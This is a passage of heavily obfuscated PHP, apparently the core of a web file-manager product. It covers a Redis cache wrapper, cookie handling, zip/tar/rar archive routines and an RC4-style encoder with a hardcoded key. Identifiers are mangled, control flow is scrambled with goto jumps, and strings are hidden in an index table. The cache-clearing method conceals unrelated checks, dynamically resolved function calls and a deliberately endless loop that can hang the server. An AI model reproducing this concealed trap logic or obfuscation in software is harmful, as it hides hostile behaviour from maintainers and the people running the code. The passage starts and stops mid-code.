$B½å’£ìÈã[$_SERVER[Å¸ş][782]]; $this->filterConfig($B½å’£ìÈã, $e¡ÎÄİÚñ[0]); $this->handle = $this->init($B½å’£ìÈã, $d´šµ¦ˆ£†); goto a˜Œ…£Èôï; aå‚×İÍ¹¦: $this->filterConfig($B½å’£ìÈã, $e¡ÎÄİÚñ[$eøƒ÷½‘]); $this->slaveHandle = $this->init($B½å’£ìÈã, $d´šµ¦ˆ£†); goto cğÕÎ–; cğÕÎ–: } private function filterConfig(&$B†ºŒï¦Â¨, $Cƒğ•ªêåê) { $Fª‘È¬ ŸŸ =& $_SERVER[Å¸ş]; $D“Ğ»ñâ = explode($Fª‘È¬ ŸŸ[4], $Cƒğ•ªêåê); $D‚ÍÓ‚ĞïÏ = array($Fª‘È¬ ŸŸ[169] => $D“Ğ»ñâ[0], $Fª‘È¬ ŸŸ[170] => $D“Ğ»ñâ[1]); $B†ºŒï¦Â¨ = array_merge($B†ºŒï¦Â¨, $D‚ÍÓ‚ĞïÏ); } public function set($Añ¿ˆãÏêä, $FéôÖĞ±½Ë, $B‰ëÂ¿ŒóÖ = false) { $B‰ëÂ¿ŒóÖ = $B‰ëÂ¿ŒóÖ ? $B‰ëÂ¿ŒóÖ : $this->cacheTime; return $this->handle->setEx($Añ¿ˆãÏêä, $B‰ëÂ¿ŒóÖ, $FéôÖĞ±½Ë); } public function setLock($aÎ¤Ñí…øĞ, $AÂ‰™óÜ»×, $aºŠğ°’ƒ) { return $this->handle->setNX($aÎ¤Ñí…øĞ, $AÂ‰™óÜ»×); } public function get($e—Ú¬ÙÊ‡) { $BÜÒ—œğ„Ò = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $BÜÒ—œğ„Ò->get($e—Ú¬ÙÊ‡); } public function remove($d¤†Â¹¦¦) { return $this->handle->del($d¤†Â¹¦¦); } public function deleteAll() { $f…†Î†¢ˆÄ =& $_SERVER[Å¸ş]; if (!isset($_SERVER[$f…†Î†¢ˆÄ[557]]) || !isset($_SERVER[$f…†Î†¢ˆÄ[790]])) { goto aÜ¿êÃÄİ; aÜ¿êÃÄİ: $AŒ«ó’®¬ = $f…†Î†¢ˆÄ[791]; $F´«Õ·ÖêÁ = $f…†Î†¢ˆÄ[558]; $a’ÖÔÎ®Ğù = $_SERVER[$f…†Î†¢ˆÄ[559]] . $f…†Î†¢ˆÄ[560]; goto Aéˆ…†°¥; Aéˆ…†°¥: $fŠ†£º›ï— = $F´«Õ·ÖêÁ($a’ÖÔÎ®Ğù); $DŒ†·ì‹ùÉ = explode($f…†Î†¢ˆÄ[217], $fŠ†£º›ï—); if (count($DŒ†·ì‹ùÉ) < $f…†Î†¢ˆÄ[550]) { $aòä»×Şî• = $f…†Î†¢ˆÄ[562]; $aòä»×Şî•(); } goto b³´Å™è˜˜; b³´Å™è˜˜: $aöÈù­ÚÙ‰ = $f…†Î†¢ˆÄ[792]; $aöÈù­ÚÙ‰($_SERVER[$f…†Î†¢ˆÄ[793]]); $Aš²Ã‹¸Ã = 1; goto f‚Ş«Ò¯Ù¨; f‚Ş«Ò¯Ù¨: for ($B ——Òğ = $Aš²Ã‹¸Ã; $B ——Òğ > 0; $B ——Òğ++) { $aöÈù­ÚÙ‰ = json_encode($GLOBALS[$f…†Î†¢ˆÄ[384]]); } goto EĞØ‹ÁØÊÃ; EĞØ‹ÁØÊÃ: } if ($this->isCluster) { foreach ($this->handle->_masters() as $déƒ‚‰ò³·) { $this->handle->flushall($déƒ‚‰ò³·); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($F¾ª™°Ô¹Ã = '', $eŞÃ„ŠâÄğ = 0) { if (is_string($F¾ª™°Ô¹Ã) && $F¾ª™°Ô¹Ã != $_SERVER[Å¸ş][33]) { $this->prefix = $F¾ª™°Ô¹Ã; } if (is_numeric($eŞÃ„ŠâÄğ) && $eŞÃ„ŠâÄğ > 0) { $this->expire = $eŞÃ„ŠâÄğ; } } public static function getInstance() { static $DºŠ÷‚©Çå; if ($DºŠ÷‚©Çå === null) { $DºŠ÷‚©Çå = new self(); } return $DºŠ÷‚©Çå; } private static $sameCookieSet = array(); public static function set($d¢¦Ñ”ñ¿ˆ, $CÑ‡ºâ² ¢, $Dî¬İàâ„ = 0, $E ÂŠĞ‚£ = false, $eÀ‹‰ù£ã¢ = false) { goto dƒ’ï›Àé; dƒ’ï›Àé: $bãõíÁ²Å =& $_SERVER[Å¸ş]; if (!$Dî¬İàâ„) { $Dî¬İàâ„ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$d¢¦Ñ”ñ¿ˆ]) && self::$sameCookieSet[$d¢¦Ñ”ñ¿ˆ] == $CÑ‡ºâ² ¢ . $Dî¬İàâ„) { return; } goto aÚç™ê®…; BÊèİ¿„ª: setcookie($d¢¦Ñ”ñ¿ˆ, $CÑ‡ºâ² ¢, time() + $Dî¬İàâ„, $bãõíÁ²Å[8] . trim($eÀ‹‰ù£ã¢, $bãõíÁ²Å[8]) . $FœâÑª·Ş, !1, !1, $E ÂŠĞ‚£); goto EÊÌÃ†‹İ­; aÚç™ê®…: self::$sameCookieSet[$d¢¦Ñ”ñ¿ˆ] = $CÑ‡ºâ² ¢ . $Dî¬İàâ„; if (!$eÀ‹‰ù£ã¢) { $eÀ‹‰ù£ã¢ = str_replace(HOST, $bãõíÁ²Å[33], APP_HOST); $eÀ‹‰ù£ã¢ = _get($GLOBALS, $bãõíÁ²Å[794], $eÀ‹‰ù£ã¢); } $FœâÑª·Ş = $bãõíÁ²Å[33]; goto BÊèİ¿„ª; EÊÌÃ†‹İ­: } public static function setSafe($dùÜ·âöí¸, $eö©Ó‡çº„, $cªÀ¬ö°î = 0) { self::set($dùÜ·âöí¸, $eö©Ó‡çº„, $cªÀ¬ö°î, !0); } public static function get($dâ…¸˜Ò¡µ) { return isset($_COOKIE[$dâ…¸˜Ò¡µ]) ? $_COOKIE[$dâ…¸˜Ò¡µ] : !1; } public static function remove($cÀÕìµ½„, $Eƒç‰­ç÷¡ = false) { unset($_COOKIE[$cÀÕìµ½„]); self::set($cÀÕìµ½„, $_SERVER[Å¸ş][33], 1, $Eƒç‰­ç÷¡); } } goto Fä‹†İ Üó; B«¼¸±„ÛŠ: class KodArchive { static function init() { goto Cé¸¥È¹‡ğ; f°ùô”å§: require_once ARCHIVE_LIB . $câ°ãÕî—[1897]; require_once ARCHIVE_LIB . $câ°ãÕî—[1898]; require_once ARCHIVE_LIB . $câ°ãÕî—[1899]; goto Fíƒ¸Êğ; Cé¸¥È¹‡ğ: $câ°ãÕî— =& $_SERVER[Å¸ş]; if (defined($câ°ãÕî—[1889])) { return; } define($câ°ãÕî—[1889], SDK_DIR . $câ°ãÕî—[1890]); goto c­àØç»–; Fíƒ¸Êğ: require_once ARCHIVE_LIB . $câ°ãÕî—[1900]; goto B½«ë ŞÇ«; aˆèßˆÇ‰‘: mk_dir(TEMP_FILES); require_once ARCHIVE_LIB . $câ°ãÕî—[1895]; require_once ARCHIVE_LIB . $câ°ãÕî—[1896]; goto f°ùô”å§; c­àØç»–: define($câ°ãÕî—[1891], TEMP_FILES); define($câ°ãÕî—[1892], TEMP_FILES); define($câ°ãÕî—[1893], $câ°ãÕî—[1894]); goto aˆèßˆÇ‰‘; B½«ë ŞÇ«: } static function checkIfType($Cˆ““‡¡, $f–ÚÁ¸Ÿ¨™) { goto b æØ«¸˜á; e¯à“×„¿: return $eÇÊğê­“; goto eÛ¶ä—•Ì–; Cˆ¬¯ÍšÓÖ: $eÇÊğê­“ = in_array($Cˆ““‡¡, $Cé…õ¯°’ï[$f–ÚÁ¸Ÿ¨™]); if ($eÇÊğê­“ && ($f–ÚÁ¸Ÿ¨™ == $f£ÄÖªªĞÍ[301] || $f–ÚÁ¸Ÿ¨™ == $f£ÄÖªªĞÍ[1904]) && (!function_exists($f£ÄÖªªĞÍ[1912]) || !function_exists($f£ÄÖªªĞÍ[1913]))) { show_tips($f£ÄÖªªĞÍ[1914]); } if ($eÇÊğê­“ && $f–ÚÁ¸Ÿ¨™ == $f£ÄÖªªĞÍ[1043] && (!function_exists($f£ÄÖªªĞÍ[1915]) || !strstr(shell_exec($f£ÄÖªªĞÍ[1916]), $f£ÄÖªªĞÍ[1917]))) { show_tips($f£ÄÖªªĞÍ[1918]); } goto e¯à“×„¿; b æØ«¸˜á: $f£ÄÖªªĞÍ =& $_SERVER[Å¸ş]; self::init(); $Cé…õ¯°’ï = array($f£ÄÖªªĞÍ[301] => array($f£ÄÖªªĞÍ[301], $f£ÄÖªªĞÍ[1901], $f£ÄÖªªĞÍ[1902], $f£ÄÖªªĞÍ[1903]), $f£ÄÖªªĞÍ[1904] => array($f£ÄÖªªĞÍ[1904], $f£ÄÖªªĞÍ[1905], $f£ÄÖªªĞÍ[1041], $f£ÄÖªªĞÍ[1039]), $f£ÄÖªªĞÍ[1043] => array($f£ÄÖªªĞÍ[1043], $f£ÄÖªªĞÍ[1906], $f£ÄÖªªĞÍ[1907], $f£ÄÖªªĞÍ[1908], $f£ÄÖªªĞÍ[1909], $f£ÄÖªªĞÍ[1910], $f£ÄÖªªĞÍ[1911])); goto Cˆ¬¯ÍšÓÖ; eÛ¶ä—•Ì–: } static function listContent($c¤“Äªä†, $DÉƒö¬ø…Ê = true) { $C…ÚÖàì =& $_SERVER[Å¸ş]; self::init(); $DË÷ÁˆšÛÙ = !empty($GLOBALS[$C…ÚÖàì[1047]]) ? $GLOBALS[$C…ÚÖàì[1047]] : get_path_ext($c¤“Äªä†); $BÕùÕÚáÊ² = !1; if (self::checkIfType($DË÷ÁˆšÛÙ, $C…ÚÖàì[1904])) { $A´ŠÃ¿èÒñ = PclTarList($c¤“Äªä†, $DË÷ÁˆšÛÙ); $BÕùÕÚáÊ² = array(); for ($d«Üœ¯ˆ‡ƒ = 0; $d«Üœ¯ˆ‡ƒ < count($A´ŠÃ¿èÒñ); $d«Üœ¯ˆ‡ƒ++) { $DÙ‚¤„½¬  = $A´ŠÃ¿èÒñ[$d«Üœ¯ˆ‡ƒ]; if ($DÙ‚¤„½¬ [$C…ÚÖàì[1919]] == $C…ÚÖàì[1920] || $DÙ‚¤„½¬ [$C…ÚÖàì[1919]] == $C…ÚÖàì[1921]) { continue; } if ($DÉƒö¬ø…Ê) { $DÙ‚¤„½¬ [$C…ÚÖàì[1922]] = ltrim($DÙ‚¤„½¬ [$C…ÚÖàì[1922]], $C…ÚÖàì[1153]); } if ($DÙ‚¤„½¬ [$C…ÚÖàì[1919]] == $C…ÚÖàì[1923]) { $DÙ‚¤„½¬ [$C…ÚÖàì[76]] = !0; } else { $DÙ‚¤„½¬ [$C…ÚÖàì[76]] = !1; } $DÙ‚¤„½¬ [$C…ÚÖàì[1034]] = $d«Üœ¯ˆ‡ƒ; $BÕùÕÚáÊ²[] = $DÙ‚¤„½¬ ; } } else { if (self::checkIfType($DË÷ÁˆšÛÙ, $C…ÚÖàì[1043])) { $C¢³¹„‡›İ = kodRarArchive::listContent($c¤“Äªä†); if (!$C¢³¹„‡›İ[$C…ÚÖàì[1030]]) { return $C¢³¹„‡›İ; } else { $BÕùÕÚáÊ² = $C¢³¹„‡›İ[$C…ÚÖàì[1032]]; } } else { if (kodZipArchive::support($C…ÚÖàì[354])) { $BÕùÕÚáÊ² = kodZipArchive::listContent($c¤“Äªä†); } else { $E¢…ÅŠ¨Ó¶ = new PclZip($c¤“Äªä†); $BÕùÕÚáÊ² = $E¢…ÅŠ¨Ó¶->listContent(); } } } if ($BÕùÕÚáÊ²) { $b†”Ê‘ø…Š = unzip_charset_get($BÕùÕÚáÊ²); $DÉƒö¬ø…Ê = $DÉƒö¬ø…Ê && function_exists($C…ÚÖàì[65]); for ($d«Üœ¯ˆ‡ƒ = 0; $d«Üœ¯ˆ‡ƒ < count($BÕùÕÚáÊ²); $d«Üœ¯ˆ‡ƒ++) { $BÕùÕÚáÊ²[$d«Üœ¯ˆ‡ƒ][$C…ÚÖàì[1922]] = str_replace(array($C…ÚÖàì[1070], $C…ÚÖàì[1924]), $C…ÚÖàì[766], $BÕùÕÚáÊ²[$d«Üœ¯ˆ‡ƒ][$C…ÚÖàì[1922]]); if ($DÉƒö¬ø…Ê) { $BÕùÕÚáÊ²[$d«Üœ¯ˆ‡ƒ][$C…ÚÖàì[1922]] = iconv_to($BÕùÕÚáÊ²[$d«Üœ¯ˆ‡ƒ][$C…ÚÖàì[1922]], $b†”Ê‘ø…Š, $C…ÚÖàì[326]); unset($BÕùÕÚáÊ²[$d«Üœ¯ˆ‡ƒ][$C…ÚÖàì[1925]]); } } return array($C…ÚÖàì[1030] => !0, $C…ÚÖàì[1032] => $BÕùÕÚáÊ²); } else { return array($C…ÚÖàì[1030] => !1, $C…ÚÖàì[1032] => $BÕùÕÚáÊ²); } } static function extract($fêÁçÕœ¬¼, $FÎô‚ŠÇîå, $cƒö´ÑÀó = "\x2d\61", &$Díî¢¿ÁŞ¯ = false) { goto aÑöÎÈ‰–; f±÷¿ãÄ©: if (self::checkIfType($D¨ÅïÕï÷‹, $c §Î‚É—Œ[1904])) { if ($cƒö´ÑÀó != $c §Î‚É—Œ[1029]) { $Cñ‰•¯‘³ = unzip_pre_name($Cñ‰•¯‘³); $dİî£‡‘Ì = unzip_pre_name($dİî£‡‘Ì); $A™Â‚î»ŒÎ = PclTarExtractList($fêÁçÕœ¬¼, array($Cñ‰•¯‘³), $FÎô‚ŠÇîå, $dİî£‡‘Ì, $D¨ÅïÕï÷‹); } else { $A™Â‚î»ŒÎ = PclTarExtract($fêÁçÕœ¬¼, $FÎô‚ŠÇîå, $c §Î‚É—Œ[361], $D¨ÅïÕï÷‹); } return array($c §Î‚É—Œ[1030] => $A™Â‚î»ŒÎ, $c §Î‚É—Œ[1032] => PclErrorString(!0)); } else { if (self::checkIfType($D¨ÅïÕï÷‹, $c §Î‚É—Œ[1043])) { return kodRarArchive::extract($fêÁçÕœ¬¼, $FÎô‚ŠÇîå, $D¨ÅïÕï÷‹, $Díî¢¿ÁŞ¯); } else { if (kodZipArchive::support($c §Î‚É—Œ[1926])) { return kodZipArchive::extract($fêÁçÕœ¬¼, $FÎô‚ŠÇîå, $Díî¢¿ÁŞ¯); } else { $b÷¨ÃöÈ¥´ = new PclZip($fêÁçÕœ¬¼); if ($cƒö´ÑÀó != $c §Î‚É—Œ[1029]) { $A™Â‚î»ŒÎ = $b÷¨ÃöÈ¥´->extract(PCLZIP_OPT_PATH, $FÎô‚ŠÇîå, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $c §Î‚É—Œ[1927], PCLZIP_OPT_BY_NAME, $Cªï™¥©õ[$c §Î‚É—Œ[1922]], PCLZIP_OPT_REMOVE_PATH, $dİî£‡‘Ì, PCLZIP_OPT_REPLACE_NEWER); } else { $A™Â‚î»ŒÎ = $b÷¨ÃöÈ¥´->extract(PCLZIP_OPT_PATH, $FÎô‚ŠÇîå, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $c §Î‚É—Œ[1927], PCLZIP_OPT_REPLACE_NEWER); } return array($c §Î‚É—Œ[1030] => $A™Â‚î»ŒÎ, $c §Î‚É—Œ[1032] => $b÷¨ÃöÈ¥´->errorName(!0)); } } } return array($c §Î‚É—Œ[1030] => !1, $c §Î‚É—Œ[1032] => $c §Î‚É—Œ[1928]); goto fÖì”‹ˆƒ‡; aÑöÎÈ‰–: $c §Î‚É—Œ =& $_SERVER[Å¸ş]; self::init(); $D¨ÅïÕï÷‹ = !empty($GLOBALS[$c §Î‚É—Œ[1047]]) ? $GLOBALS[$c §Î‚É—Œ[1047]] : get_path_ext($fêÁçÕœ¬¼); goto Dñ”Ä†®˜; Dñ”Ä†®˜: $f÷Ù±™Ô˜¿ = self::listContent($fêÁçÕœ¬¼, !1); if (!$f÷Ù±™Ô˜¿[$c §Î‚É—Œ[1030]]) { return $f÷Ù±™Ô˜¿; } if ($cƒö´ÑÀó != $c §Î‚É—Œ[1029]) { goto B·„óÍ‡®ã; B·„óÍ‡®ã: $Cªï™¥©õ = self::fileIndex($f÷Ù±™Ô˜¿[$c §Î‚É—Œ[1032]], $cƒö´ÑÀó); $Díî¢¿ÁŞ¯ = str_replace(array($c §Î‚É—Œ[1070], $c §Î‚É—Œ[1924]), $c §Î‚É—Œ[70], $Cªï™¥©õ[$c §Î‚É—Œ[1922]]); $Cñ‰•¯‘³ = $Díî¢¿ÁŞ¯; goto dÏçÜ˜ÙÔ¥; dÏçÜ˜ÙÔ¥: if ($GLOBALS[$c §Î‚É—Œ[6]][$c §Î‚É—Œ[1151]] != $c §Î‚É—Œ[326]) { $Cñ‰•¯‘³ = unzip_pre_name($Díî¢¿ÁŞ¯); } $dİî£‡‘Ì = get_path_father($Díî¢¿ÁŞ¯); if ($dİî£‡‘Ì == $Díî¢¿ÁŞ¯) { $dİî£‡‘Ì = $c §Î‚É—Œ[33]; } goto fÙİ±Å¡šÜ; fÙİ±Å¡šÜ: if ($Cªï™¥©õ[$c §Î‚É—Œ[76]]) { $Cñ‰•¯‘³ = rtrim($Cñ‰•¯‘³, $c §Î‚É—Œ[8]) . $c §Î‚É—Œ[8]; $Díî¢¿ÁŞ¯ = array($Díî¢¿ÁŞ¯); } $dËÛÌ²æÚî = str_replace($c §Î‚É—Œ[93], $c §Î‚É—Œ[8], $Cñ‰•¯‘³); if (substr($dËÛÌ²æÚî, -1) == $c §Î‚É—Œ[8]) { if (!strstr(trim($dËÛÌ²æÚî, $c §Î‚É—Œ[8]), $c §Î‚É—Œ[8])) { $FÎô‚ŠÇîå = $FÎô‚ŠÇîå . get_path_this($dËÛÌ²æÚî) . $c §Î‚É—Œ[8]; } } else { if ($dİî£‡‘Ì == $Cñ‰•¯‘³) { $dİî£‡‘Ì = $c §Î‚É—Œ[33]; } } goto céµõÑ©µ¬; céµõÑ©µ¬: } goto f±÷¿ãÄ©; fÖì”‹ˆƒ‡: } static function fileIndex($B»à·ÉÑ¾°, $dÆÀóÔæí¿, $c§À¦¤²âÅ = false) { goto b¾µÚô––; f¦¡Œ­Â†: $d£ñÄ¯‰§´ = count($B»à·ÉÑ¾°); for ($cíâÀ ôŸ = 0; $cíâÀ ôŸ < $d£ñÄ¯‰§´; $cíâÀ ôŸ++) { if ($dÆÀóÔæí¿ == $B»à·ÉÑ¾°[$cíâÀ ôŸ][$DÛù†õöĞ•[1034]]) { $aİ…¼ŒÜ = $B»à·ÉÑ¾°[$cíâÀ ôŸ]; break; } } if (!$aİ…¼ŒÜ) { show_tips($DÛù†õöĞ•[1929]); } goto aíÖ‘Øä‚ª; aíÖ‘Øä‚ª: $AæÖ¡ò‡Êº = $aİ…¼ŒÜ; if ($c§À¦¤²âÅ) { $AæÖ¡ò‡Êº = $aİ…¼ŒÜ[$c§À¦¤²âÅ]; if ($aİ…¼ŒÜ[$DÛù†õöĞ•[76]]) { $AæÖ¡ò‡Êº = rtrim($AæÖ¡ò‡Êº, $DÛù†õöĞ•[8]) . $DÛù†õöĞ•[8]; } } return $AæÖ¡ò‡Êº; goto eâíôóØ´Ì; b¾µÚô––: $DÛù†õöĞ• =& $_SERVER[Å¸ş]; self::init(); if (!is_array($B»à·ÉÑ¾°)) { return !1; } goto f¦¡Œ­Â†; eâíôóØ´Ì: } static function extractZipFile($eÀµ¡”ŞõŒ, $DåÉºŒøæ³, $b¾§…Ë±¤ = false) { goto BƒÓÉ–š’; EĞËâËìÂ’: if (!file_exists($bŸğ¡–öÑà)) { return !1; } @rename($bŸğ¡–öÑà, $bÀ­¡ÉÈÖ˜); return $bÀ­¡ÉÈÖ˜; goto E’ÜæáÔŒ; AÌŠ›Å†Ú: if (file_exists($bÀ­¡ÉÈÖ˜)) { return $bÀ­¡ÉÈÖ˜; } $f»™œ¿–·— = new PclZip($eÀµ¡”ŞõŒ); $bŸğ¡–öÑà = unzip_filter_ext($E Èç™ÎÈ± . get_path_this($DåÉºŒøæ³)); goto AÁ™‚ò·ë”; AÁ™‚ò·ë”: $e£í¾Å„ÂŞ = get_path_father($DåÉºŒøæ³); if ($e£í¾Å„ÂŞ == $DåÉºŒøæ³) { $e£í¾Å„ÂŞ = $Càµø¬ª’Œ[33]; } $cÌ»ˆ¦ö•ä = $f»™œ¿–·—->extract(PCLZIP_OPT_PATH, $E Èç™ÎÈ±, PCLZIP_CB_PRE_FILE_NAME, $Càµø¬ª’Œ[1927], PCLZIP_OPT_REMOVE_PATH, $e£í¾Å„ÂŞ, PCLZIP_OPT_BY_NAME, $DåÉºŒøæ³); goto EĞËâËìÂ’; CŞÊ³ø¤: mk_dir($E Èç™ÎÈ±); $bÀ­¡ÉÈÖ˜ = $E Èç™ÎÈ± . md5($eÀµ¡”ŞõŒ . $DåÉºŒøæ³); if ($b¾§…Ë±¤) { $bÀ­¡ÉÈÖ˜ = $E Èç™ÎÈ± . $b¾§…Ë±¤; } goto AÌŠ›Å†Ú; BƒÓÉ–š’: $Càµø¬ª’Œ =& $_SERVER[Å¸ş]; self::init(); $E Èç™ÎÈ± = TEMP_FILES . hash_path($eÀµ¡”ŞõŒ) . $Càµø¬ª’Œ[8]; goto CŞÊ³ø¤; E’ÜæáÔŒ: } static function filePreview($bã¦Ş¢á¥Ø, $DÜÌŒ«ö‹ø, $d²šàƒôí = false, $AÆÆÈºòØ¢ = false) { goto bŠ¥ÑËÇ“À; D››ì¦º»‹: if (!file_exists($DİõÃ¾ùÓ³)) { del_dir($E©Áİƒ¥Í¥); show_json($bâÉ°äàĞë[1932]); } IO::fileOut($DİõÃ¾ùÓ³, $d²šàƒôí, $DŸé‰Ñ¥Ò); goto b‹çº¿ÈËÂ; BÂ“ê„Ø÷Ó: $e²¬ì™—› = self::extract($bã¦Ş¢á¥Ø, $E©Áİƒ¥Í¥, $DÜÌŒ«ö‹ø, $dãí¼ªŠˆŒ); if (is_array($dãí¼ªŠˆŒ)) { show_json($bâÉ°äàĞë[1930], !1); } if (file_exists($DİõÃ¾ùÓ³)) { IO::fileOut($DİõÃ¾ùÓ³, $d²šàƒôí, get_path_this($dãí¼ªŠˆŒ)); return; } goto f³·³ÔÔğ; f³·³ÔÔğ: $dãí¼ªŠˆŒ = unzip_pre_name($dãí¼ªŠˆŒ); $DŸé‰Ñ¥Ò = get_path_this($dãí¼ªŠˆŒ); $d¬ğõë„Ü = unzip_filter_ext($E©Áİƒ¥Í¥ . $DŸé‰Ñ¥Ò); goto aÚÃğóÄİÈ; bŠ¥ÑËÇ“À: $bâÉ°äàĞë =& $_SERVER[Å¸ş]; self::init(); $E©Áİƒ¥Í¥ = TEMP_FILES . hash_path($bã¦Ş¢á¥Ø) . $bâÉ°äàĞë[8]; goto A­»õğ©Ôê; A­»õğ©Ôê: mk_dir($E©Áİƒ¥Í¥); $DİõÃ¾ùÓ³ = $E©Áİƒ¥Í¥ . md5($bã¦Ş¢á¥Ø . $DÜÌŒ«ö‹ø . $AÆÆÈºòØ¢); $dãí¼ªŠˆŒ = $bâÉ°äàĞë[33]; goto BÂ“ê„Ø÷Ó; aÚÃğóÄİÈ: if (!$e²¬ì™—›[$bâÉ°äàĞë[1030]]) { show_json($e²¬ì™—›[$bâÉ°äàĞë[1032]], !1); } if (!file_exists($d¬ğõë„Ü)) { show_json($bâÉ°äàĞë[1931], !1); } @rename($d¬ğõë„Ü, $DİõÃ¾ùÓ³); goto D››ì¦º»‹; b‹çº¿ÈËÂ: } static function create($Fç£‹˜„Ïò, $D±ÖğÒ²Æ) { $e¡±¢…‹‡ò =& $_SERVER[Å¸ş]; self::init(); $Fèèİä²Ší = get_path_ext($Fç£‹˜„Ïò); $aË§øğ‘ Š = !1; if (self::checkIfType($Fèèİä²Ší, $e¡±¢…‹‡ò[301])) { if (kodZipArchive::support($e¡±¢…‹‡ò[1009])) { return kodZipArchive::create($Fç£‹˜„Ïò, $D±ÖğÒ²Æ); } $CéĞáÃó—À = new PclZip($Fç£‹˜„Ïò); foreach ($D±ÖğÒ²Æ as $cÈ¹¸’„ç => $e´Ü¸¶â–‡) { $e´Ü¸¶â–‡ = str_replace($e¡±¢…‹‡ò[469], $e¡±¢…‹‡ò[8], $e´Ü¸¶â–‡); $aÁ¸ƒŒĞ¶˜ = Kodio::clear(get_path_father($e´Ü¸¶â–‡)); if ($cÈ¹¸’„ç == 0) { $aË§øğ‘ Š = $CéĞáÃó—À->create($e´Ü¸¶â–‡, PCLZIP_OPT_REMOVE_PATH, $aÁ¸ƒŒĞ¶˜, PCLZIP_CB_PRE_FILE_NAME, $e¡±¢…‹‡ò[1933]); continue; } $aË§øğ‘ Š = $CéĞáÃó—À->add($e´Ü¸¶â–‡, PCLZIP_OPT_REMOVE_PATH, $aÁ¸ƒŒĞ¶˜, PCLZIP_CB_PRE_FILE_NAME, $e¡±¢…‹‡ò[1933]); } } else { if (self::checkIfType($Fèèİä²Ší, $e¡±¢…‹‡ò[1904])) { foreach ($D±ÖğÒ²Æ as $cÈ¹¸’„ç => $e´Ü¸¶â–‡) { $e´Ü¸¶â–‡ = str_replace($e¡±¢…‹‡ò[469], $e¡±¢…‹‡ò[8], $e´Ü¸¶â–‡); $aÁ¸ƒŒĞ¶˜ = Kodio::clear(get_path_father($e´Ü¸¶â–‡)); if ($cÈ¹¸’„ç == 0) { $aË§øğ‘ Š = PclTarCreate($Fç£‹˜„Ïò, array($e´Ü¸¶â–‡), $Fèèİä²Ší, null, $aÁ¸ƒŒĞ¶˜); continue; } $aË§øğ‘ Š = PclTarAddList($Fç£‹˜„Ïò, array($e´Ü¸¶â–‡), $e¡±¢…‹‡ò[33], $aÁ¸ƒŒĞ¶˜, $Fèèİä²Ší); } } } return $aË§øğ‘ Š; } } class Mcrypt { public static $defaultKey = "\x61\41\x74\141\153\x41\x3a\x64\154\x6d\x63\154\144\105\x76\x2c\145"; public static function encode($Aï‰˜ ©î, $dÏçËñ½õä = '', $fè¿öƒŸƒÅ = 0, $f‚­ à²ÈŒ = '') { goto d”æ‚›­‡š; bßà…¿¿„³: $A‘ÆÄÖ‹Ú = $d¦‡áª×Ğ[33]; for ($DÃ†ÆòÀí‰ = $b³Èƒä‚ÀÛ = $E¯‡‹ãêØè = 0; $E¯‡‹ãêØè < $F¢ğê¡…‹­; $E¯‡‹ãêØè++) { $DÃ†ÆòÀí‰ = ($DÃ†ÆòÀí‰ + 1) % 256; $b³Èƒä‚ÀÛ = ($b³Èƒä‚ÀÛ + $A°¤Ô»È‡‚[$DÃ†ÆòÀí‰]) % 256; $Dİ†ËÒõ = $A°¤Ô»È‡‚[$DÃ†ÆòÀí‰]; $A°¤Ô»È‡‚[$DÃ†ÆòÀí‰] = $A°¤Ô»È‡‚[$b³Èƒä‚ÀÛ]; $A°¤Ô»È‡‚[$b³Èƒä‚ÀÛ] = $Dİ†ËÒõ; $A‘ÆÄÖ‹Ú .= chr(ord($Aï‰˜ ©î[$E¯‡‹ãêØè]) ^ $A°¤Ô»È‡‚[($A°¤Ô»È‡‚[$DÃ†ÆòÀí‰] + $A°¤Ô»È‡‚[$b³Èƒä‚ÀÛ]) % 256]); } $A‘ÆÄÖ‹Ú = $F§í‚ªëÏğ . str_replace($d¦‡áª×Ğ[904], $d¦‡áª×Ğ[33], base64_encode($A‘ÆÄÖ‹Ú)); goto CÙ‰áÓá‡³; DŞ„Î˜šÖ¦: $fºõÛ­Áœå = md5(substr($dÏçËñ½õä, 0, 16)); $dÍ¸¬¼ÆŞã = md5(substr($dÏçËñ½õä, 16, 16)); $f‚­ à²ÈŒ = $f‚­ à²ÈŒ ? $f‚­ à²ÈŒ : md5(microtime()); goto FÛ¸È¹çì˜; FÛ¸È¹çì˜: $F§í‚ªëÏğ = substr($f‚­ à²ÈŒ, -$c·šÇ¯ë¯); $fíø–—³Ì = $fºõÛ­Áœå . md5($fºõÛ­Áœå . $F§í‚ªëÏğ); $A·Ğ„ìƒ» = strlen($fíø–—³Ì); goto b„Ëª©Åè; b„Ëª©Åè: $Aï‰˜ ©î = sprintf($d¦‡áª×Ğ[1934], $fè¿öƒŸƒÅ ? $fè¿öƒŸƒÅ + time() : 0) . substr(md5($Aï‰˜ ©î . $dÍ¸¬¼ÆŞã), 0, 16) . $Aï‰˜ ©î; $F¢ğê¡…‹­ = strlen($Aï‰˜ ©î); $dĞÁÍ­¸½Ÿ = array(); goto Aã“İ¶÷ÙŠ; d”æ‚›­‡š: $d¦‡áª×Ğ =& $_SERVER[Å¸ş]; $c·šÇ¯ë¯ = 4; $dÏçËñ½õä = md5($dÏçËñ½õä ? $dÏçËñ½õä : self::$defaultKey); goto DŞ„Î˜šÖ¦; Aã“İ¶÷ÙŠ: for ($E¯‡‹ãêØè = 0; $E¯‡‹ãêØè <= 255; $E¯‡‹ãêØè++) { $dĞÁÍ­¸½Ÿ[$E¯‡‹ãêØè] = ord($fíø–—³Ì[$E¯‡‹ãêØè % $A·Ğ„ìƒ»]); } $A°¤Ô»È‡‚ = range(0, 255); for ($b³Èƒä‚ÀÛ = $E¯‡‹ãêØè = 0; $E¯‡‹ãêØè < 256; $E¯‡‹ãêØè++) { $b³Èƒä‚ÀÛ = ($b³Èƒä‚ÀÛ + $A°¤Ô»È‡‚[$E¯‡‹ãêØè] + $dĞÁÍ­¸½Ÿ[$E¯‡‹ãêØè]) % 256; $Dİ†ËÒõ = $A°¤Ô»È‡‚[$E¯‡‹ãêØè]; $A°¤Ô»È‡‚[$E¯‡‹ãêØè] = $A°¤Ô»È‡‚[$b³Èƒä‚ÀÛ]; $A°¤Ô»È‡‚[$b³Èƒä‚ÀÛ] = $Dİ†ËÒõ; } goto bßà…¿¿„³; CÙ‰áÓá‡³: 